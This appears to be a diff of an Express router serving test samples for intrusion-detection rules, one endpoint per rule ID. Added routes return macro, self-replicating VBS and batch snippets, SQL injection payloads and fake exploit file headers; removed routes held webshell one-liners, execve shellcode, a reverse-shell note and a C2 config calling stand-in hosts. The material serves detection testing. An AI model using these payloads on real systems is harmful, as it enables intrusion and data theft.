-            { user: 'admin', hash: '5f4dcc3b5aa765d61d8327deb882cf99', type: 'MD5' },
-            { user: 'root', hash: '$2a$10$N9qo8uLOickgx2ZMRZoMy.MqrqvKwFVcKjxL0NZCj/YPdGTq1i3oC', type: 'bcrypt' },
-            { user: 'user1', hash: '$6$rounds=5000$saltsalt$hash', type: 'SHA-512' },
-            { user: 'backup', hash: 'e10adc3949ba59abbe56e057f20f883e', type: 'MD5' }
-        ]
-    });
+// SID 6400000 - PE File with Auto-Run
+router.get('/test/6400000', (req, res) => {
+    const mzHeader = Buffer.from([0x4D, 0x5A]);
+    res.set({ 'Content-Type': 'application/octet-stream', 'X-Test-SID': '6400000' });
+    res.send(Buffer.concat([mzHeader, Buffer.from(' autorun=setup.exe')]));
+});
+
+// SID 6400001 - Office Macro Shell Execute
+router.get('/test/6400001', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400001' });
+    res.send('Sub Macro1()\n  Shell "cmd.exe", vbNormalFocus\n  Execute "calc.exe"\nEnd Sub');
+});
+
+// SID 6400002 - Word Macro AutoOpen
+router.get('/test/6400002', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400002' });
+    res.send('Sub AutoOpen()\n  MsgBox "Macro executed!"\nEnd Sub');
+});
+
+// SID 6400003 - Excel Macro Auto_Open
+router.get('/test/6400003', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400003' });
+    res.send('Sub Auto_Open()\n  Application.Run "Malicious"\nEnd Sub');
+});
+
+// SID 6400007 - Macro CreateObject
+router.get('/test/6400007', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400007' });
+    res.send('Set obj = CreateObject("WScript.Shell")\nobj.Run "powershell.exe"');
+});
+
+// SID 6400011 - VBScript Self-Replication
+router.get('/test/6400011', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename="virus.vbs"', 'X-Test-SID': '6400011' });
+    res.send('Set fso = WScript.CreateObject("Scripting.FileSystemObject")\nfso.CopyFile WScript.ScriptFullName, "C:\\virus.vbs"');
+});
+
+// SID 6400012 - JavaScript FileSystem Access
+router.get('/test/6400012', (req, res) => {
+    res.set({ 'Content-Type': 'text/html', 'X-Test-SID': '6400012' });
+    res.send('<script>var fso = new ActiveXObject("Scripting.FileSystemObject");\nvar file = fso.CreateTextFile("C:\\\\malware.txt");</script>');
+});
+
+// SID 6400013 - Batch File Self-Replication
+router.get('/test/6400013', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename="virus.bat"', 'X-Test-SID': '6400013' });
+    res.send('@echo off\ncopy %0 C:\\Windows\\virus.bat\nstart C:\\Windows\\virus.bat');
+});
+
+// SID 6400020 - Java Malicious Class File
+router.get('/test/6400020', (req, res) => {
+    const javaHeader = Buffer.from([0xCA, 0xFE, 0xBA, 0xBE]); // Java class magic bytes
+    res.set({ 'Content-Type': 'application/java-archive', 'Content-Disposition': 'attachment; filename="Exploit.class"', 'X-Test-SID': '6400020' });
+    res.send(Buffer.concat([javaHeader, Buffer.from(' Malicious Java Class')]));
+});
+
+// SID 6400021 - PDF with Malicious JavaScript
+router.get('/test/6400021', (req, res) => {
+    res.set({ 'Content-Type': 'application/pdf', 'Content-Disposition': 'attachment; filename="malicious.pdf"', 'X-Test-SID': '6400021' });
+    res.send('%PDF-1.4\n/JS (app.alert("Hacked!"))\n/JavaScript /S /JavaScript\n%%EOF');
+});
+
+// SID 6400026 - SQL Injection SELECT
+router.get('/test/6400026', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400026' });
+    res.send('SQL Query: /view_recent.asp?currentpage=1 UNION SELECT username, password FROM users');
+});
+
+// SID 6400027 - SQL Injection UNION SELECT
+router.get('/test/6400027', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400027' });
+    res.send('Payload: currentpage=1 UNION SELECT * FROM admin WHERE 1=1');
+});
+
+// SID 6400028 - SQL Injection INSERT
+router.get('/test/6400028', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400028' });
+    res.send('Payload: currentpage=1; INSERT INTO users VALUES (999, "hacker", "owned")');
+});
+
+// SID 6400032 - Cool Java Exploit Kit
+router.get('/test/6400032', (req, res) => {
+    const pkHeader = Buffer.from([0x50, 0x4B]);
+    res.set({ 'Content-Type': 'application/java-archive', 'Content-Disposition': 'attachment; filename="exploit.jar"', 'X-Test-SID': '6400032' });
+    res.send(Buffer.concat([pkHeader, Buffer.from(' SunJCE.class exploit code')]));
+});
+
+// SID 6400033 - Suspicious EXE from File Share
+router.get('/test/6400033', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '6400033' });
+    res.send('Download from: https://a.pomf.cat/malware.exe\nFile hash: d41d8cd98f00b204e9800998ecf8427e');
 });
 
 // ============================================
-// C2 & SUSPICIOUS PATTERNS (17-20)
+// Legacy endpoints
 // ============================================
-router.get('/c2/user-agent', (req, res) => {
-    res.set({
-        'X-Test-SID': '6400001',
-        'X-Bot-Response': 'true'
-    });
-    res.send(`
-        Bot command received.
-        User-Agent patterns for malware:
-        - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Trojan.Win32)
-        - Wget/1.0 (linux)
-        - curl/7.0 (malware-downloader)
-        - Python-urllib/2.7 (botnet)
-        
-        Command: EXECUTE_PAYLOAD
-        Status: READY
-    `);
-});
-
-router.get('/c2/b64-payload', (req, res) => {
-    // Suspicious base64 payload (simulated C2 command)
-    const payload = Buffer.from(`
-        cmd: download_and_execute
-        url: http://malicious.example.com/stage2.exe
-        persist: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
-        exfil: ftp://data.evil.com/stolen/
-        beacon: 300
-    `).toString('base64');
-    
-    res.set('X-Test-SID', '6400002');
-    res.json({
-        status: 'ok',
-        data: payload,
-        encoded: true
-    });
-});
-
-router.get('/c2/shellcode', (req, res) => {
-    // Simulated shellcode pattern (NOP sled + fake shellcode bytes)
-    const shellcode = '\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80';
-    const hexPayload = '4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d';
-    
-    res.set('X-Test-SID', '6400003');
-    res.type('text/plain').send(`
-        Shellcode payload detected:
-        ${shellcode}
-        
-        Hex encoded executable:
-        ${hexPayload}
-        
-        Meterpreter staging...
-        Reverse shell connecting to 10.0.0.1:4444
-    `);
-});
-
-router.get('/c2/webshell', (req, res) => {
-    res.set('X-Test-SID', '6400033');
-    res.type('text/html').send(`
-        <?php
-        // c99 webshell simulation
-        @eval($_POST['cmd']);
-        system($_GET['c']);
-        passthru($cmd);
-        shell_exec($_REQUEST['exec']);
-        ?>
-        
-        <%@ Page Language="C#" %>
-        <% Response.Write(Server.Execute(Request["cmd"])); %>
-        
-        <jsp:scriptlet>
-        Runtime.getRuntime().exec(request.getParameter("cmd"));
-        </jsp:scriptlet>
-        
-        WSO Shell v2.0 - File Manager
-        r57shell - Server info
-        b374k shell - Command execution ready
-    `);
-});
-
-// ============================================
-// EICAR inline & API (legacy endpoints)
-// ============================================
-router.get('/eicar-inline', (req, res) => {
-    res.set('Content-Type', 'text/plain');
+router.get('/eicar.com', (req, res) => {
+    res.set({ 'Content-Type': 'application/octet-stream', 'Content-Disposition': 'attachment; filename="eicar.com"' });
     res.send(EICAR_STRING);
 });
 
@@ -572,9 +507,7 @@ router.get('/api/eicar', (req, res) => {
         name: 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE',
         size: EICAR_STRING.length,
         string: EICAR_STRING,
-        md5: '44d88612fea8a8f36de82e1278abb02f',
-        sha256: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
-        suricata_sids: ['5900003', '5900004', '5900005', '5900006', '5900007', '5900008']
+        md5: '44d88612fea8a8f36de82e1278abb02f'
     });
 });
 
